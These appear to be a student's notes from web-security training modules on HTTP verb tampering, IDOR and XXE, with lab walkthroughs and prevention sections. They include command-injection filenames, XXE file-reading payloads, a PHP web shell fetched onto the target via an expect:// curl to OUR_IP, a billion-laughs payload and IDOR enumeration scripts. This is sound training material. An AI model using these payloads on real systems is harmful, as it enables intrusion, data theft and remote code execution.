## HTTP Verb Tampering

#### Intro to HTTP Verb Tampering
```
## HTTP Verb Tampering
- All the HTTP verbs (remember to use them): https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods
- Common HTTP verbs:
```

| Verb      | Description                                                                                         |
| --------- | --------------------------------------------------------------------------------------------------- |
| `HEAD`    | Identical to a GET request, but its response only contains the `headers`, without the response body |
| `PUT`     | Writes the request payload to the specified location                                                |
| `DELETE`  | Deletes the resource at the specified location                                                      |
| `OPTIONS` | Shows different options accepted by a web server, like accepted HTTP verbs                          |
| `PATCH`   | Apply partial modifications to the resource at the specified location                               |
| Get       |                                                                                                     |
| POST      |                                                                                                     |
| TRACE     |                                                                                                     |
| CONNECT   |                                                                                                     |
```
## Insecure Configurations
- E.g. Like the below, no handling for other users
<Limit GET POST>
    Require valid-user
</Limit>

## Insecure Coding
- E.g. method only applied for GET parameter
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

#### Bypassing Basic Authentication
```
## Identify
- E.g. On a file manager wbe application
	-> Requests requires some form of authentication (e.g. basic Basic Auth)

	-> No valid credentials give a 401 Unauthorized page.

## Exploit
- E.g. On a file manager wbe application
	-> Capture response with burp

	-> change request method for an attempt (get to post)

	-> Send an options method to see if it accepts it:
areaeric@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/

	-> Change request to head and authentication is bypassed.

## Questions
- try to see which methods are allowed:
curl -i -X OPTIONS http://94.237.62.149:58449/
	-> works, but doesn't say what other methos are accepted.
curl -i -X HEAD http://94.237.62.149:58449/
curl -i -X PUT http://94.237.62.149:58449/
curl -i -X DELETE http://94.237.62.149:58449/
curl -i -X PATCH http://94.237.62.149:58449/

-> all methods accepted.

-> Using burp intercept and PUT methods bypass authentication.
```

#### Bypassing Security Filers
```
## Identify
- E.g. On a file manager wbe application
	-> Inserting a malicious character (;) on a new file name
	-> Received "Malicious Request Denied"

## Exploit
- E.g. On a file manager wbe application
	-> Using  burp to modify the resoponse and changing the verb to post.
	-> Filter bypassed.

	-> Confirm the security filter is bypassed through doing another injection: file1; touch file2;

	-> Files successfully creates, vulnerability confirmed.

## Questions
To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./

-> Inserted a malicious character and got denied. (ref ## Identify)

-> Attempted to bypass through burp capture, file1; cp /flag.txt ./; . (ref ## Exploit).
	-> Use change method in burp to POST and bypassed filter and got flag.
```

#### Verb Tampering Prevention
```
## Insecure configuration
- E.g. an .htaccess page configuration:
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>

- E.g Tomcat Web server configuration
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>

- E.g. .ASP.NET configuration
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>

## Insecure Coding
- E.g. Inconsitent use of HTTP methods
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

## Insecure Direct Object References (IDOR)
#### Intro to IDOR
```
## What makes an IDOR Vulnerability
- Caused by weak access control system, as exposure of direct-object reference is not a problem/weakness if unrelated people can't access it with good access-control system.
- Main takeaway is an IDOR vulnerability exists due to the lack of an access control on the back-end

## Impact of IDOR vulnerabilities
- Information disclosure, known as IDOR Information Disclosure vulnerabilities
- Allows elevation of user privileges, known as IDOR Insecure Function calls 
	-> E.g. Exposure of URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these for non-admin users
		-> If we can access these functions, we may be able to call it and execute it, if the backend does not deny our our function calls.
```

#### Identifying IDORs
```
## URL Parameters
- First step to exploit IDOR is to identify Direct object references

- E.g. We saw a file with the reference: `?uid=1` or `?filename=file_1.pdf`, we try to increment the value to `?uid=2` or `?filename=file_2.pdf` and see if we can retrieive the other data.

## AJAX Calls
- When we see direct object references in Javascript code, we can test them for IDOR vulnerabilties.
E.g. A function that a standard user should never call and contains direct object references:

function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}

## Understanding hashing/Encoding
- We can decode a object reference if they are not secure.
	- E.g. Decoding base64 object reference (from the character set):
		`?filename=ZmlsZV8xMjMucGRm`) -> `file_123.pdf`

- We can calculate direct object reference of hashes if we have access to the source code that hashed it.
	-> e.g. download.php?filename=c81e728d9d4c2f636f067f89cc14862c
	with source code 

$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
	-> This makes us easier to calculate the filename for other potential fles.

## Compare User Roles
- Compare whether two users with different roles can make the same request.
- e.g. Viewing salary available to one user (user1) we control
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}

but can another user like user2 we control make such API calls?
-> If this is the case, we identified an IDOR vulnerability and can look for other object references to exploit.
```

#### Mass IDOR Enumeration
```
## Insecure parameters
- E.g. On a Employee Manager Web
	-> Logged in with a uid of 1
	-> clicked on document.php
	-> Clicked on the file link, we have 
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf

	-> We see a predicatbale naming pattern, user uid and the month/year as the file name

	-> This is the most basic type of IDOR vulnerability and it is known as static file IDOR (provided that we can access the files).

	-> Changing the uid parameter in the GET parameter in the URL, documents.php?uid=1 to something like documents.php?uid=2, we obtained the following files
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf

	-> This is the files for the other users.
		-> illustates how there is no access control system at the backend.

## Mass Enumeration
- E.g. On a Employee Manager web cont.
	-> [CTRL+SHIFT+C] to enable element inspect and click ont the file links to view their html source code:
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

	-> We can curl it with our uid and give it a test:
areaeric@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

	-> using regex (better practice) to only get the documment links, as follows:
```shell-session
areaeric@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf

	-> Use of bash script to return the document of all employees, then use wget to download the links:
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

## Questions
Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.
94.237.62.195:52961

- Looking at the web page, we have post request that stores uid in POST parameter instead (ref ## Insecure parameters). 

- We want to perform query POST request to read from uid2 (ref ## Mass Enumeration
	-> saw these as documents url:
	/documents/Invoice_1_09_2021.pdf 

	-> Enumerating the document url using POST method:
curl -X POST "http://94.237.62.195:52961/documents.php/" --data-raw 'uid=1' | grep -oP "\/documents.*?.pdf"

curl -X POST "http://94.237.62.195:52961/documents.php" --data-raw 'uid=3' | grep -oP "\/documents.*?.pdf"

	-> Using bash script:
#!/bin/bash

url="http://94.237.62.195:52961"

for i in {1..20}; do
        for link in $(curl -s -X POST "http://94.237.62.195:52961/documents.php" -d "uid=$i" | grep -oP "\/documents.*?.pdf"); do
			    echo $url/$link
                wget -q $url/$link
        done
done

	-> Above is for getting documents.
	-> To get the flag, we do slightly change the script
		-> First locate the flag

#!/bin/bash

url="http://SERVER_IP:PORT"
for i in {1..20}; do
        for link in $(curl -s -X POST "http://94.237.62.195:52961/documents.php" -d "uid=$i" | grep -P "\.txt"); do
			    echo $link
                ## wget -q $url/$link
        done
done

	-> user id 15 with flag document name: /documents/flag_11dfa168ac8eb2958e38425728623c98.txt

	-> getting flag: wget http://94.237.62.195:52961/documents/flag_11dfa168ac8eb2958e38425728623c98.txt
```

#### Bypassing Encoded References
```
## Encoded reference
- Encoded references are harder to bypass, but it can still be possible.
- E.g. Employee Manager web application Contracts functionality.
	-> Clicking on it and interceptnig through burp we see the following data:
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b

	-> Hash appeared to be in md5 format.
	
	-> We can attempt to hash various value like uid, username, filename...
	-> Here we compared the md5 hash of our uid:
areaeric@htb[/htb]$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -

	-> We can attempt to hash with othe fields and none matches our hash.
	-> This is a Secure Direct Objeect Reference, except it has one fatal flaw.

## Function Disclosure
- E.g. Employee Manager web application Contracts functionality cont.
	-> Looking at the source code in the webpage, we see the following:
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
	-> We see that it is performing base64 encoding of the uid through the btoa function, then being hashed to md5.
	-> We can confirm with the following encoding:
areaeric@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -

**Tip:** We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.

	-> We have jsut turned the references into an IDOR.

## Mass Enumeration
- E.g. Employee Manager web application Contracts functionality cont.
	-> We remove the trailing - character with a script of the following:
areaeric@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
...
	-> We can now make a POST Request on download.php as the contract value
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done

- We can run the exploit and it should download all contracts for employees 1-10:
areaeric@htb[/htb]$ bash ./exploit.sh
areaeric@htb[/htb]$ ls -1

contract_006d1236aee3f92b8322299796ba1989.pdf


## Questions
Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.

- We see the object does not seem to have a secure reference (ref ## Encoded Reference and Function Disclosure):
	-> The parameter can be decoded into our user ID using url encoding then base64 (through glancing at the value) 
	-> This is also verified in the front-end code.s

- We will calculate the contract parameter and download the file (ref ## mass enumeration):

	-> Confirm the Computed the uid value
	for uid in $(echo -n 1 | base64 -w 0 | jq -sRr @uri)
	do
		echo $uid
		echo "hello"
	done
		
	-> making sure it works on uid=1
	for uid in $(echo -n 1 | base64 -w 0 | jq -sRr @uri)
	do
		echo $uid
		curl -sOJ http://94.237.49.166:31090/download.php?contract=$uid
	done

	-> Extenson to mutliple uid
	for i in {1..20}; do
		for uid in $(echo -n $i | base64 -w 0 | jq -sRr @uri)
		do echo $uid
		curl -sOJ http://94.237.49.166:31090/download.php?contract=$uid
		done
	done

	-> Examined file, one of them has non-zero value:
cat contract_98f13708210194c475687be6106a3b84.pdf 
```

#### IDOR in Insecure APIs
```
## Identifying Insecure APIs
- E.g. Employee Manager Web application
	-> Click on the Edit Profile Page for IDOR vulnerabilities
	-> see Full Name, Email, About Me
	-> clicking on Update Profile, we'll see that they get persisted through refreshes, which means they get updated in database somewhere.

	-> Intercepting the Update request using Burp and look into it

	-> We see a Put request to /profile/api.php/profile/1 and an intersting Json parameter:
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
	-> See that PUT requests includes hidden parameters like uid, uuid and most interestingly role, which is set to employee
		-> Web application appears to be setting the user privilege (e.g. role) ont the client sie
		-> Unless web application has solid access control system on the back-end, we should be able to get an arbitrary role for our user, which may grant us more privilege.

## Exploiting Insecure APIs
- E.g. Employee Manager Web application cont.
	-> We could try to manipulate the other parameters such as uid in attempt to take over their account
		-> changing uid to 2 gives us uid mismatch
		-> probably caused by api endpoint.
		-> now changing to /profile/api.php/profile/2 and uid to 2 to attempt avoiding it.
		-> now getting uuid mismatch

	-> We now attempt to create new users with a POST request
		-> Received an Create new employees is for admins only.
		-> Same thing happens with a Delete request.
		-> application might be checking our authroisation through role=employee

	-> We now try to create our role to admin/administrator (generic guesses) to gain higher privileges
		-> Received an invalid role in HTTp response.

	-> So it seems like if we can gain an valid role, we should be fine. So, we should be testing information disclosure (GET requests) to help us with our attack.

## Exercise
Try to read the details of the user with 'uid=5'. What is their 'uuid' value?
- We perform the same thing as indicated in the section, then queried  GET /profile/api.php/profile/5 for uid=5 (ref ##insecure parameters)
	-> Didn't quite work, we will probably have to go back to a previous page to see how it works.
	-> We will capture the page, look at the source code to see how it works
		-> Looking in the souruce code we see it executes the /profile/api.php/profile/1 api, so changing it to /profile/api.php/profile/2 was a test to see if anything is revealed.
			-> Turned out the it revealed the info for usr with uid 2, which is an IDOR informaton disclosure vulnerability. 

	- Getting answer by accessing /profile/api.php/profile/5
```

#### Chaining IDOR Vulnerabilities 
```
## Information Disclosure
- E.g. Employee manager app cont.
	-> We see an GET request API for an user and that the onlyl form of authorisation is an cookie.
		-> We could try another get request with another uid (e.g. uid=2)
		-> Confirmed an IDOR INformation disclosure vulnerability.
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}

## Modifying Other User's Details
- E.g. Employee manager app cont.
	-> With the user's uuid at hand, we can change the user's details by sending a PUT request to /profile/api.php/profile/2 with the above details along with any modication we make.
		-> Here we change the email and about to pwn@employees.htb
	-> We didn't get any error this time and updated the user's details.

## Chaining Two IDOR vulnerabilities
- E.g. Employee manager app cont.
	-> We write a script to perform mass enumeration on IDOR information DIsclosure vulnerability.
		-> We would see the following user after we enumerated all users:
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
		-> The critical information here is the role, which we can set our user with.

	-> We can now set our user with the role "web_admin" using burp
		-> No errors were received
		-> Refreshing the page would give us the role of the employee.

	-> using this new role, we can attempt to create a user we did previously with uid=50 (with some random uuid)
{
    "uid": "50",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Test",
    "email": "test@employees.htb",
    "about": ""
}
		-> We didn't receive an error
		-> Combined IDOR information disclosure and IDOR Secure function calls.


## Questions
Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.

- Following the section in the page, we first write to script for IDOR mass enumeration  (ref ## mass enumeration)
	-> Single request
		for i in {1..10}; do
			curl -s http://83.136.254.223:57845/profile/api.php/profile/$i >> employee_info
		done

	-> found the following: {"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"admin@employees.htb","about":"Never gonna give you up, Never gonna let you down"}

- We will be chaining the IDOR vulnerability and changing the admin email (ref ##Chaining Two IDOR vulnerabilities)
	-> changing role to staff_admin through changing request in put method.

	-> Changing the email through burp put method and adjusting appropriate values for cookies.{"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"Never gonna give you up, Never gonna let you down"}
	-> get flag
```

#### IDOR Prevention
```
## Overview
- We learned various ways to identify and exploit IDOR vulnerabilities in web pages, web functions, and API calls. 
 
	-> By now, we should have understood that IDOR vulnerabilities are mainly caused by improper access control on the back-end servers.
	
	-> To prevent such vulnerabilities, we first have to build an object-level access control system and then use secure references for our objects when storing and calling them.

## Object-Level Access Control

- An Access Control system should be at the core of any web application since it can affect its entire design and structure.
 
	-> To properly control each area of the web application, its design has to support the segmentation of roles and permissions in a centralized manner. 
	
	-> However, Access Control is a vast topic, so we will only focus on its role in IDOR vulnerabilities, represented in `Object-Level` access control mechanisms.

- User roles and permissions are a vital part of any access control system, which is fully realized in a Role-Based Access Control (RBAC) system.
 
	-> To avoid exploiting IDOR vulnerabilities, we must map the RBAC to all objects and resources. 
	
	-> The back-end server can allow or deny every request, depending on whether the requester's role has enough privileges to access the object or the resource.

- Once an RBAC has been implemented, each user would be assigned a role that has certain privileges. 
 
	-> Upon every request the user makes, their roles and privileges would be tested to see if they have access to the object they are requesting. 
	
	-> They would only be allowed to access it if they have the right to do so.

- There are many ways to implement an RBAC system and map it to the web application's objects and resources, and designing it in the core of the web application's structure is an art to perfect. 
 
	-> The following is a sample code of how a web application may compare user roles to objects to allow or deny access control:

match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}

- The above example uses the `user` token, which can be `mapped from the HTTP request made to the RBAC` to retrieve the user's various roles and privileges. 
 
	-> Then, it only allows read/write access if the user's `uid` in the RBAC system matches the `uid` in the API endpoint they are requesting. 
	
	-> Furthermore, if a user has `admin` as their role in the back-end RBAC, they are allowed read/write access.

- In our previous attacks, we saw examples of the user role being stored in the user's details or in their cookie, both of which are under the user's control and can be manipulated to escalate their access privileges.
 
	-> The above example demonstrates a safer approach to mapping user roles, as the user privileges `were not be passed through the HTTP request`, but mapped directly from the RBAC on the back-end using the user's logged-in session token as an authentication mechanism.

- There's a lot more to access control systems and RBACs, as they can be some of the most challenging systems to design.
 
	-> This, however, should give us an idea of how we should control user access over web applications' objects and resources.

## Object Referencing

- While the core issue with IDOR lies in broken access control (`Insecure`), having access to direct references to objects (`Direct Object Referencing`) makes it possible to enumerate and exploit these access control vulnerabilities. We may still use direct references, but only if we have a solid access control system implemented.

- Even after building a solid access control system, we should never use object references in clear text or simple patterns (e.g. `uid=1`).
 
	-> We should always use strong and unique references, like salted hashes or `UUID`'s. 
	
	-> For example, we can use `UUID V4` to generate a strongly randomized id for any element, which looks something like (`89c9b29b-d19f-4515-b2dd-abb6e693eb20`). 
	
	-> Then, we can map this `UUID` to the object it is referencing in the back-end database, and whenever this `UUID` is called, the back-end database would know which object to return. 
	
	-> The following example PHP code shows us how this may work:

$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";

- Furthermore, as we have seen previously in the module, we should never calculate hashes on the front-end. We should generate them when an object is created and store them in the back-end database. 
 
	-> Then, we should create database maps to enable quick cross-referencing of objects and references.

- Finally, we must note that using `UUID`s may let IDOR vulnerabilities go undetected since it makes it more challenging to test for IDOR vulnerabilities. 
 
	-> This is why strong object referencing is always the second step after implementing a strong access control system. 
	
	-> Furthermore, some of the techniques we learned in this module would work even with unique references if the access control system is broken, like repeating one user's request with another user's session, as we have previously seen.

- If we implement both of these security mechanisms, we should be relatively safe against IDOR vulnerabilities.
```


## XML External Entity (XXE) Injection
#### Intro to XXE
```
## XML
- XML is designed for flexible transfer and storage of data and documents in various types of applications
- E.g. XML document representing an e-mail address structure:
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
	-> Key elements of XML:
```

| Key           | Definition                                                                                                    | Example                                  |
| ------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `Tag`         | The keys of an XML document, usually wrapped with (`<`/`>`) characters.                                       | `<date>`                                 |
| `Entity`      | XML variables, usually wrapped with (`&`/`;`) characters.                                                     | `&lt;`                                   |
| `Element`     | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>`                |
| `Attribute`   | Optional specifications for any element that are stored in the tags, which may be used by the XML parser.     | `version="1.0"`/`encoding="UTF-8"`       |
| `Declaration` | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.   | `<?xml version="1.0" encoding="UTF-8"?>` |
|               |                                                                                                               |                                          |
|               |                                                                                                               |                                          |
```
## XML DTD
- Allows the validation of an XML document against a pre-defined document structure
- E.g. DTD for previous email XML
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>

- DTD can be stored within the XML document itself, right ater the XML Declaration or it can be stroed as an external file.
	-> e.g. DTD reference for email XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">

- We can also store DTD through a url
	- E.g. DTD reference for email XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">

## XML Entities
- We can also write custom entities (variables) in XML DTDs
	-> E.g. Variable for previous email xml example
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>

- Variables are referenced between & and ;
	-> E.g. using a variable in xml
		 &company;

- We can reference External XML Entities with the SYSTEM keyword
	-> E.g. Referencing External entities for email example 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>

**Note:** We may also use the `PUBLIC` keyword instead of `SYSTEM` for loading external resources, which is used with publicly declared entities and standards, such as a language code (`lang="en"`). In this module, we'll be using `SYSTEM`, but we should be able to use either in most cases.
```

#### Local File Disclosure
```
## Identifying 
- E.g. Contact Form
	-> We fill the contact form and click on send data, intercept it with Burp and see that it accepts xml data.
		-> Makes it a potential XXE testing target. 
		-> Take note of which elements are being displayed, so we know which elements to inject into, here it's the email element.

	-> Define an entity and use it as the variable in the email element:
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>

**Note:** In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.

	-> Now we insert &company; into the email element. 
		-> Web application responds with the value of the variable company.
		-> This confirms that we are dealing with a web application vulnerable to XXE.

**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

## Reading Sensitive Files
- E.g. Contact Form cont.
	-> Reading sensitive file through using the following response in burp and sending it:
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
		-> Able to get the content of /etc/passwd file and successfully exploited the XXE vulnerability to read local files. 
		-> We can refer to file inclusion for related attacks through file disclosure.

**Tip:** In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

## Reading Source code
- E.g. Contact Form cont.
	-> Reading source code of index.php
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file://index.php">
]>
		-> Failed to work and did not receive content.
		-> Happened due to file we obtain is not in proper XMl format, so it fails to be refereced as an external XML entity 
			-> It cannot contain XML's special character like `<`/`>`/`&` or binary data
			-> solution is to base64 encode our files
		
	-> Reading file through base64 encoding
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
		-> note that this trick only works on PHP web applications.

## Remote Code Execution with XXE
- The most efficient way to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app and then we can interact with it to execute commands. 
	-> Require PHP expect module to be installed and enabled 

- E.g. Contact Form cont.
	-> We first Write a basic PHP web shell and start a python web server:
areaeric@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
areaeric@htb[/htb]$ sudo python3 -m http.server 80

	-> Then we execute a curl command that downloads our web shell into the remote server:

<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

**Note:** The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

## Other XXE attacks
- Use of XXE to cause Denial of Service (DOS) to the hosting web server.
- E.g. Contact Form cont.
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
	-> This doesn't usuallt work on modern web servers as they protect against entity self-reference.

## Questions
Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.

- We first try to identify which element of the form is vulnerable (ref ## Identifying).
	-> Injected the following variable on <email>&company;<email>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
		and the field is indeed vulnerable.

- Attempt to read source code (ref ## Reading Source code):
	<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
		-> Obtained some base64 content

	->  Decoding it gives:
	echo 'PD9waHAKCiRhcGlfa2V5ID0gIlVUTTFOak0wTW1SekoyZG1jVEl6TkQwd01YSm5aWGRtYzJSbUNnIjsKCnRyeSB7CgkkY29ubiA9IHBnX2Nvbm5lY3QoImhvc3Q9bG9jYWxob3N0IHBvcnQ9NTQzMiBkYm5hbWU9dXNlcnMgdXNlcj1wb3N0Z3JlcyBwYXNzd29yZD1pVWVyXnZkKGUxUGw5Iik7Cn0KCmNhdGNoICggZXhjZXB0aW9uICRlICkgewogCWVjaG8gJGUtPmdldE1lc3NhZ2UoKTsKfQoKPz4K' | base64 -d

		-> Got api key.
```

#### Advanced File Disclosure
```
## Advanced Exfiltration with CDATA
- This method works for all web applications and all data types, including binary data.

- To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>)
	-> This allows XML parser to consider this part as raw data, which may include any type of data.

- E.g. Contact Form cont.
	-> One way to tackle this issue to define a begin internal entitiy with <![CDATA[ and end internal entitiy with ]]> and then place our external entitiy file in between:
	
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
	-> If we reference the &joined, it should contain our escape data.
		-> However this doesn't work, since XML prevents joining of internal and external entities.
		-> To bypass this can use the XML parameter entities Entities.

	-> XML parameter entities is a special type of entities that starts with a % character and can only be used within the DTD.
		-> If we reference them from an external source (e.g. our own server), then all of them would be considered external and can be joined.

<!ENTITY joined "%begin;%file;%end;">

		-> We try and read submitDetails.php file first by first storing the above line into DTD file (e.g. xxe.dtd), host it on our machine, and then reference it as an external entity on the target web application:

areaeric@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
areaeric@htb[/htb]$ python3 -m http.server 8000

		-> Referencing external entity (xxe.dtd) and the print the &joined
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
